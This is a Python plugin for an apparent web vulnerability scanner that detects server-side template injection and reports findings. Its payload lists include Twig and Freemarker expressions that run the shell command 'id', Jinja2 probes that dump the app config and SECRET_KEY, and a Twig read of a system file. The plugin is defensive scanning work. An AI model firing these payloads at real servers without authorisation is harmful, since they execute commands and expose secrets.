"""Server-Side Template Injection (SSTI) detection plugin."""

import re
from typing import List, Optional
import httpx

from plugins.base import BasePlugin
from core.models import Finding, CrawledEndpoint, SeverityLevel, AttackType, AttackPrimitive


# SSTI payloads grouped by template engine
SSTI_PAYLOADS = [
    # Generic (works across many engines)
    {"payload": "{{7*7}}", "expected": "49", "engine": "generic"},
    {"payload": "${7*7}", "expected": "49", "engine": "generic"},
    {"payload": "<%= 7*7 %>", "expected": "49", "engine": "erb"},
    {"payload": "#{7*7}", "expected": "49", "engine": "generic"},
    {"payload": "{{7*'7'}}", "expected": "7777777", "engine": "jinja2"},

    # Jinja2 specific
    {"payload": "{{config}}", "expected": "<Config", "engine": "jinja2"},
    {"payload": "{{config.items()}}", "expected": "SECRET_KEY", "engine": "jinja2"},

    # Twig specific
    {"payload": "{{_self.env.display('id')}}", "expected": "uid=", "engine": "twig"},

    # Freemarker
    {"payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "expected": "uid=", "engine": "freemarker"},

    # Mako
    {"payload": "${7*7}", "expected": "49", "engine": "mako"},

    # Pebble
    {"payload": "{% set x = 7*7 %}{{x}}", "expected": "49", "engine": "pebble"},
]

# RCE escalation payloads (safe - read-only operations)
RCE_ESCALATION = {
    "jinja2": [
        {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "indicator": "__subclasses__", "desc": "Python class hierarchy accessible"},
        {"payload": "{{config.__class__.__init__.__globals__}}", "indicator": "os", "desc": "Global namespace accessible"},
    ],
    "twig": [
        {"payload": "{{'/etc/hostname'|file_excerpt(0,50)}}", "indicator": "", "desc": "File read via Twig filter"},
    ],
}


class SSTIPlugin(BasePlugin):
    name = "ssti"
    description = "Server-Side Template Injection detection"

    async def detect(
        self,
        endpoint: CrawledEndpoint,
        session: httpx.AsyncClient,
        context: Optional[dict] = None,
    ) -> List[Finding]:
        findings = []

        params_to_test = {}
        if endpoint.params:
            params_to_test.update(endpoint.params)
        if endpoint.form_data:
            params_to_test.update(endpoint.form_data)

        if not params_to_test:
            return findings

        for param_name, original_value in params_to_test.items():
            finding = await self._test_ssti(
                session, endpoint, param_name, original_value
            )
            if finding:
                findings.append(finding)

        return findings

    async def _test_ssti(
        self,
        session: httpx.AsyncClient,
        endpoint: CrawledEndpoint,
        param_name: str,
        original_value: str,
    ) -> Optional[Finding]:
        """Test for SSTI."""
        for test in SSTI_PAYLOADS:
            payload = test["payload"]
            expected = test["expected"]
            engine = test["engine"]

            if endpoint.method == "POST" and endpoint.form_data:
                data = dict(endpoint.form_data)
                data[param_name] = payload
                response = await self._send_request(
                    session, endpoint.url, method="POST", data=data
                )
            else:
                params = dict(endpoint.params) if endpoint.params else {}
                params[param_name] = payload
                response = await self._send_request(
                    session, endpoint.url, params=params
                )

            if response is None:
                continue

            body = response.text

            if expected in body:
                # Confirmed SSTI - try to identify engine and check RCE
                severity = SeverityLevel.HIGH
                cvss = 8.8
                primitive = AttackPrimitive.CODE_EXEC
                description = f"SSTI detected in '{param_name}' using {engine} engine"

                # Try RCE escalation
                if engine in RCE_ESCALATION:
                    for esc_test in RCE_ESCALATION[engine]:
                        esc_resp = await self._try_escalation(
                            session, endpoint, param_name, esc_test["payload"]
                        )
                        if esc_resp and esc_test["indicator"] in esc_resp.text:
                            severity = SeverityLevel.CRITICAL
                            cvss = 9.8
                            description += f" → RCE confirmed: {esc_test['desc']}"
                            break

                return Finding(
                    vuln_type=AttackType.SSTI,
                    severity=severity,
                    url=endpoint.url,
                    method=endpoint.method,
                    parameter=param_name,
                    payload=payload,
                    evidence=f"Template expression evaluated: {payload} → {expected} (engine: {engine})",
                    description=description,
                    cvss_score=cvss,
                    owasp_category="A03:2021 - Injection",
                    primitive=primitive,
                )

        return None

    async def _try_escalation(
        self,
        session: httpx.AsyncClient,
        endpoint: CrawledEndpoint,
        param_name: str,
        payload: str,
    ) -> Optional[httpx.Response]:
        """Try RCE escalation payload."""
        if endpoint.method == "POST" and endpoint.form_data:
            data = dict(endpoint.form_data)
            data[param_name] = payload
            return await self._send_request(
                session, endpoint.url, method="POST", data=data
            )
        else:
            params = dict(endpoint.params) if endpoint.params else {}
            params[param_name] = payload
            return await self._send_request(
                session, endpoint.url, params=params
            )
